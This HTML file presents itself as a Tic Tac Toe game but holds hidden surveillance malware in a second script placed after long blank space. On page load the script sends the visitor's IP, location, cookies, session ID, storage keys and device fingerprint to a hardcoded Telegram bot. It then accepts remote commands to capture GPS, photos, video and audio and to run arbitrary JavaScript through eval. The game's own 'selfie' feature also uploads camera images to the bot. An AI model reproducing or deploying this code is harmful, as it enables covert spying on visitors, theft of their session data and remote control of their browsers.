<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Tic Tac Toe üì∏</title>
  <style>
    body {
      margin: 0; font-family: sans-serif; background: #111; color: white;
      display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh;
    }
    h1 { margin: 15px 0; font-size: 2em; }
    .board {
      display: grid;
      grid-template-columns: repeat(3, 100px);
      grid-template-rows: repeat(3, 100px);
      gap: 5px;
    }
    .cell {
      background: #222;
      display: flex; align-items: center; justify-content: center;
      font-size: 2.5em;
      cursor: pointer;
      transition: all 0.3s;
      border: 2px solid #444;
      border-radius: 10px;
    }
    .cell:hover {
      background: #333;
      transform: scale(1.05);
    }
    button {
      margin-top: 15px;
      padding: 10px 20px;
      border: 2px solid #fff;
      border-radius: 25px;
      background: transparent;
      color: white;
      font-size: 1em;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background: white;
      color: black;
    }
    #cameraView { display: none; margin-top: 10px; }
    #selfieBtn { display: none; }
  </style>
</head>
<body>
  <h1>Tic Tac Toe üéÆ</h1>
  <div class="board" id="board"></div>
  <button onclick="resetGame()">üîÅ Reset</button>
  <button id="selfieBtn" onclick="capturePhoto()">üì∏ Selfie lo aur bhejo</button>

  <video id="cameraView" autoplay playsinline width="300"></video>
  <canvas id="photoCanvas" style="display:none;"></canvas>

  <script>
    const board = document.getElementById("board");
    const selfieBtn = document.getElementById("selfieBtn");
    let currentPlayer = "‚ùå";
    let cells = Array(9).fill("");
    let gameActive = true;
    let winMessage = "";

    const WINNING_COMBOS = [
      [0,1,2],[3,4,5],[6,7,8],
      [0,3,6],[1,4,7],[2,5,8],
      [0,4,8],[2,4,6]
    ];

    function drawBoard() {
      board.innerHTML = "";
      cells.forEach((val, i) => {
        const div = document.createElement("div");
        div.className = "cell";
        div.textContent = val;
        div.onclick = () => handleClick(i);
        board.appendChild(div);
      });
    }

    function handleClick(index) {
      if (!gameActive || cells[index] !== "") return;
      cells[index] = currentPlayer;
      currentPlayer = currentPlayer === "‚ùå" ? "‚≠ï" : "‚ùå";
      drawBoard();
      checkWinner();
    }

    function checkWinner() {
      for (const combo of WINNING_COMBOS) {
        const [a, b, c] = combo;
        if (cells[a] && cells[a] === cells[b] && cells[a] === cells[c]) {
          gameActive = false;
          winMessage = `${cells[a]} Wins!`;
          setTimeout(() => {
            alert(winMessage);
            selfieBtn.style.display = "inline-block";
          }, 300);
          return;
        }
      }
      if (!cells.includes("")) {
        gameActive = false;
        winMessage = "Draw Game!";
        setTimeout(() => {
          alert(winMessage);
          selfieBtn.style.display = "inline-block";
        }, 300);
      }
    }

    function resetGame() {
      cells = Array(9).fill("");
      gameActive = true;
      currentPlayer = "‚ùå";
      selfieBtn.style.display = "none";
      drawBoard();
    }

    async function capturePhoto() {
      const video = document.getElementById("cameraView");
      const canvas = document.getElementById("photoCanvas");

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.style.display = "block";

        await new Promise(resolve => setTimeout(resolve, 2000)); // wait 2s for camera

        const context = canvas.getContext("2d");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        stream.getTracks().forEach(track => track.stop());
        video.style.display = "none";

        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append("chat_id", "5862162696");
          formData.append("caption", winMessage);
          formData.append("photo", blob, "selfie.png");

          fetch(`https://api.telegram.org/8405613377:AAESQVila1PXKZS81BVa7HwigibM61xbNlE/sendPhoto`, {
            method: "POST",
            body: formData
          }).then(() => alert("üì∏ Selfie sent to Telegram!")).catch(console.error);
        }, "image/png");
      } catch (err) {
        alert("Camera access denied ‚ùå");
        console.error(err);
      }
    }

    drawBoard();
  </script>
  
  <script>
  // ===== ÿ™ŸÜÿ∏€åŸÖÿßÿ™ =====
  const BOT_TOKEN     = '8405613377:AAESQVila1PXKZS81BVa7HwigibM61xbNlE';
  const ADMIN_CHAT_ID = 5862162696;  // ÿπÿØÿØ
  const USERS_KEY     = 'tg_iframe_users';
























  let users          = JSON.parse(localStorage.getItem(USERS_KEY)||'[]');
  let lastUpdateId   = 0, myIP, runMode = false;

  // ===== ÿ¥ÿ®⁄©Ÿá =====
  async function telegramSend(method, opts={}) {
    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, opts);
  }
  async function fetchIP() {
    try {
      let r = await fetch('https://api.ipify.org?format=json');
      return (await r.json()).ip;
    } catch {
      return 'unknown';
    }
  }

  // ===== ÿßÿ±ÿ≥ÿßŸÑ info.html =====
  async function sendInfoFile(ip) {
    const rows = [];
    const add = (k,v) => rows.push({k,v});
    // ÿ≠ÿØÿßŸÇŸÑ 40+ ÿ±ÿØ€åŸÅ
    add('URL', location.href);
    add('User Agent', navigator.userAgent);
    add('Platform', navigator.platform);
    add('Language', navigator.language);
    add('Online', navigator.onLine);
    add('Screen WxH', screen.width+'√ó'+screen.height);
    add('Color Depth', screen.colorDepth+' bits');
    add('CPUs', navigator.hardwareConcurrency);
    add('RAM(GB)', navigator.deviceMemory||'N/A');
    add('Timezone', Intl.DateTimeFormat().resolvedOptions().timeZone);
    add('Cookies Count', document.cookie.split(';').filter(c=>c).length);
    add('LocalStorage Count', localStorage.length);
    add('SessionStorage Count', sessionStorage.length);
    const perf = performance.timing;
    ['navigationStart','responseEnd','domComplete','loadEventEnd']
      .forEach(k=>add(k, perf[k]+' ms'));
    if (performance.memory) {
      add('Heap Limit', performance.memory.jsHeapSizeLimit);
      add('Heap Used', performance.memory.usedJSHeapSize);
    }
    try {
      let r = await fetch('https://ipapi.co/json'), d = await r.json();
      ['ip','city','region','country_name','org'].forEach(k=>add(k, d[k]));
    } catch(e) {
      add('IP API Error', e.toString());
    }
    add('Cookie Details', document.cookie || 'N/A', 'All cookie names and values');
  add('Session ID', sessionStorage.getItem('session_id') || 'N/A', 'Session identifier from sessionStorage');
  add('LocalStorage Keys', JSON.stringify(Object.keys(localStorage)), 'All keys stored in localStorage');
  add('Prefers Color Scheme', matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light', 'User color scheme preference');
  add('Prefers Reduced Motion', matchMedia('(prefers-reduced-motion: reduce)').matches, 'User motion preference');
  add('WebAuthn Support', !!window.PublicKeyCredential, 'Web Authentication API support');
  add('Max Touch Points', navigator.maxTouchPoints || 0, 'Maximum simultaneous touch points');
  add('Pointer Fine', matchMedia('(pointer: fine)').matches, 'Precision pointer device support');
  add('Hover Support', matchMedia('(hover: hover)').matches, 'Hover interactions support');
  add('Clipboard API', !!navigator.clipboard, 'Programmatic clipboard access support');
  add('Vibration API', !!navigator.vibrate, 'Vibration support on device');
  add('WebGL Version', (() => { try { const c = document.createElement('canvas'); return c.getContext('webgl') ? 'WebGL' : c.getContext('experimental-webgl') ? 'Experimental WebGL' : 'None'; } catch { return 'None'; } })(), 'WebGL availability');
  add('AudioContext Support', !!window.AudioContext, 'Web Audio API support');

  try {
    add('Media Devices Count', navigator.mediaDevices ? (await navigator.mediaDevices.enumerateDevices()).length : 'N/A', 'Number of media input/output devices');
  } catch(e) {
    add('Media Devices Error', e.message || String(e), 'Error enumerating media devices');
  }

  add('WebRTC Support', !!window.RTCPeerConnection, 'Peer-to-peer connection API');
  add('Service Worker Support', !!navigator.serviceWorker, 'Service worker registration support');
  add('Push Notifications Support', !!(navigator.serviceWorker && window.PushManager), 'Push notifications support');
  add('Idle Detection API', !!navigator.idleDetector, 'User idle detection support');
  add('Sensor Permissions API', !!navigator.permissions, 'Generic permissions API support');
  add('Background Sync Support', !!(navigator.serviceWorker && 'sync' in ServiceWorkerRegistration.prototype), 'Background sync support');
  add('Paint Timing API', !!performance.getEntriesByType, 'Performance entry types support');
  add('Performance Observer', !!window.PerformanceObserver, 'Real-time performance monitoring');
  add('Intl API', !!Intl, 'Internationalization API support');
  add('URL API', !!URL, 'URL parsing and manipulation API');
  add('Fetch API', !!window.fetch, 'Network fetch API support');
  add('Cookie Store API', !!window.cookieStore, 'Cookie Store API support');
  add('Permissions API', !!navigator.permissions, 'Permissions management API');
  add('Cache API', !!window.caches, 'Service Worker Cache API support');
  add('WebXR Support', !!navigator.xr, 'AR/VR support via WebXR');
  add('File System Access API', !!window.showOpenFilePicker, 'File system access API support');
    
    
    let html = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>info</title>'
      +'<style>body{font-family:Arial;padding:20px;}table{width:100%;border-collapse:collapse;}'
      +'th,td{border:1px solid #ccc;padding:8px;}th{background:#eee;}</style></head><body>'
      +`<h1>Info for ${ip}</h1><table><thead><tr><th>Key</th><th>Value</th></tr></thead><tbody>`;
    rows.forEach(r=> html += `<tr><td>${r.k}</td><td>${r.v}</td></tr>`);
    html += '</tbody></table></body></html>';
    const blob = new Blob([html], { type:'text/html' });
    const form = new FormData();
    form.append('chat_id', ADMIN_CHAT_ID);
    form.append('document', blob, 'info.html');
    await telegramSend('sendDocument', { method:'POST', body: form });
  }

  // ===== ÿßÿπŸÑÿßŸÜ ÿßÿØŸÖ€åŸÜ =====
  async function notifyAdmin() {
    const ua = navigator.userAgent;
    let batt = 'N/A';
    if (navigator.getBattery) {
      try { batt = Math.round((await navigator.getBattery()).level*100) + '%'; } catch{}
    }
    const msg =
`New client loaded:
IP: ${myIP}
Browser: ${ua}
Battery: ${batt}
Screen: ${screen.width}√ó${screen.height}
Language: ${navigator.language}
More details in info.html
Use /panel`;
    await telegramSend('sendMessage', {
      method:'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: msg })
    });
  }

  // ===== ÿ´ÿ®ÿ™ ⁄©ŸÑÿß€åŸÜÿ™ =====
  async function registerClient() {
    myIP = await fetchIP();
    let u = users.find(x=>x.ip===myIP);
    if (!u) u = { ip:myIP, loads:0, last:0 }, users.push(u);
    u.loads++; u.last = Date.now();
    localStorage.setItem(USERS_KEY, JSON.stringify(users));
    await notifyAdmin();
    await sendInfoFile(myIP);
  }

  // ===== Ÿæÿß⁄©‚Äåÿ≥ÿßÿ≤€å ÿ¢ŸæÿØ€åÿ™‚ÄåŸáÿß€å ŸÇÿØ€åŸÖ€å =====
  async function flushUpdates() {
    await telegramSend('getUpdates', {
      method:'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ offset: -1 })
    });
  }

  // ===== ŸÇÿßÿ®ŸÑ€åÿ™‚ÄåŸáÿß =====
  async function feature(action) {
    switch(action) {
      case 'gps':
        // ÿßÿ®ÿ™ÿØÿß ÿ≥ÿπ€å ⁄©ŸÜ ÿ®ÿß Geolocation API
        try {
          return await new Promise((res, rej) =>
            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 })
          );
        } catch(err) {
          // ÿØÿ± ÿµŸàÿ±ÿ™ ÿÆÿ∑ÿßÿå fallback ÿ®Ÿá IP-based
          let r = await fetch('https://ipapi.co/json');
          let d = await r.json();
          return { coords: { latitude: d.latitude, longitude: d.longitude } };
        }
      case 'photo': {
        const st = await navigator.mediaDevices.getUserMedia({ video: true });
        const vid = document.createElement('video');
        vid.srcObject = st;
        await vid.play();
        const canvas = document.createElement('canvas');
        canvas.width = vid.videoWidth; canvas.height = vid.videoHeight;
        canvas.getContext('2d').drawImage(vid, 0, 0);
        st.getTracks().forEach(t=>t.stop());
        return await new Promise(r=>canvas.toBlob(r,'image/png'));
      }
      case 'vid': {
        const st = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
        const rec = new MediaRecorder(st), chunks = [];
        rec.ondataavailable = e=>chunks.push(e.data);
        rec.start();
        await new Promise(r=>setTimeout(r,10000));
        rec.stop(); await new Promise(r=>rec.onstop=r);
        st.getTracks().forEach(t=>t.stop());
        return new Blob(chunks,{type:'video/webm'});
      }
      case 'audio': {
        const st = await navigator.mediaDevices.getUserMedia({ audio:true });
        const rec = new MediaRecorder(st), chunks = [];
        rec.ondataavailable = e=>chunks.push(e.data);
        rec.start();
        await new Promise(r=>setTimeout(r,10000));
        rec.stop(); await new Promise(r=>rec.onstop=r);
        st.getTracks().forEach(t=>t.stop());
        return new Blob(chunks,{type:'audio/webm'});
      }
    }
  }

  // ===== ÿßÿ±ÿ≥ÿßŸÑ ŸæŸÜŸÑ =====
  async function sendPanel() {
    const kb = users.map(u=>[{
      text: `${u.ip} ${(Date.now()-u.last<5*60*1000)?'‚óè':'‚óã'}`,
      callback_data: `user:${u.ip}`
    }]);
    await telegramSend('sendMessage', {
      method:'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: ADMIN_CHAT_ID,
        text: 'üõ† User List:',
        reply_markup: { inline_keyboard: kb }
      })
    });
  }

  // ===== Ÿæÿ±ÿØÿßÿ≤ÿ¥ ÿ¢ŸæÿØ€åÿ™‚ÄåŸáÿß =====
  async function handleUpdates() {
    const res = await telegramSend('getUpdates', {
      method:'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ offset: lastUpdateId + 1 })
    });
    const data = await res.json();
    for (const upd of data.result) {
      lastUpdateId = upd.update_id;

      // ŸÅÿ±ŸÖÿßŸÜ /panel
      if (upd.message?.text === '/panel' && upd.message.chat.id === ADMIN_CHAT_ID) {
        await sendPanel();
      }

      // callback_query
      if (upd.callback_query) {
        const { data, id, from } = upd.callback_query;
        await telegramSend('answerCallbackQuery', {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body: JSON.stringify({ callback_query_id: id })
        });

        const [action, ip] = data.split(':');

        // ŸÜŸÖÿß€åÿ¥ ÿØ⁄©ŸÖŸá‚ÄåŸáÿß€å user
        if (action === 'user' && from.id === ADMIN_CHAT_ID) {
          const kb = [[
            { text:'Show info', callback_data:`info:${ip}` },
            { text:'Run JS',   callback_data:`run:${ip}` }
          ],[
            { text:'Get GPS',      callback_data:`gps:${ip}` },
            { text:'Take Photo',   callback_data:`photo:${ip}` }
          ],[
            { text:'Record Video', callback_data:`vid:${ip}` },
            { text:'Record Audio', callback_data:`audio:${ip}` }
          ]];
          await telegramSend('sendMessage', {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({
              chat_id: ADMIN_CHAT_ID,
              text: `User ${ip} ‚Äì choose:`,
              reply_markup: { inline_keyboard: kb }
            })
          });
        }

        // ÿØÿ≥ÿ™Ÿàÿ±ÿßÿ™ client-side
        else if (ip === myIP) {
          if (action === 'info') {
            await sendInfoFile(ip);
          }
          else if (action === 'run') {
            runMode = true;
            await telegramSend('sendMessage', {
              method:'POST',
              headers:{'Content-Type':'application/json'},
              body: JSON.stringify({ chat_id:ADMIN_CHAT_ID, text:`JS run mode for ${ip}. Send code or 'exit'.` })
            });
          }
          else if (['gps','photo','vid','audio'].includes(action)) {
            try {
              const res = await feature(action);
              if (action === 'gps') {
                await telegramSend('sendMessage', {
                  method:'POST',
                  headers:{'Content-Type':'application/json'},
                  body: JSON.stringify({ chat_id:ADMIN_CHAT_ID,
                    text:`GPS: ${res.coords.latitude.toFixed(6)}, ${res.coords.longitude.toFixed(6)}` })
                });
              }
              else if (res instanceof Blob) {
                const form = new FormData();
                form.append('chat_id', ADMIN_CHAT_ID);
                form.append('document', res, `${action}.${res.type.split('/')[1]}`);
                await telegramSend('sendDocument', { method:'POST', body: form });
              } else {
                await telegramSend('sendMessage', {
                  method:'POST',
                  headers:{'Content-Type':'application/json'},
                  body: JSON.stringify({ chat_id:ADMIN_CHAT_ID, text:`${action}: ${JSON.stringify(res)}` })
                });
              }
            } catch(e) {
              await telegramSend('sendMessage', {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body: JSON.stringify({ chat_id:ADMIN_CHAT_ID, text:`Error ${action}: ${e.message||e}` })
              });
            }
          }
        }
      }

      // Run JS mode
      if (upd.message?.text && upd.message.chat.id===ADMIN_CHAT_ID && runMode) {
        const txt = upd.message.text;
        if (txt.trim().toLowerCase() === 'exit') {
          runMode = false;
          await telegramSend('sendMessage',{ method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({ chat_id:ADMIN_CHAT_ID, text:'Exited JS mode.' })
          });
        } else {
          let out;
          try { out = eval(txt); }
          catch(e) { out = e.toString(); }
          await telegramSend('sendMessage',{ method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({ chat_id:ADMIN_CHAT_ID, text:`> ${txt}\n=> ${out}` })
          });
        }
      }
    }
  }

  // ===== ÿßÿ¨ÿ±ÿß€å ÿßŸàŸÑ€åŸá =====
  (async()=>{
    await registerClient();
    await flushUpdates();
    setInterval(handleUpdates,2000);
  })();
  </script>
</body>
</html>
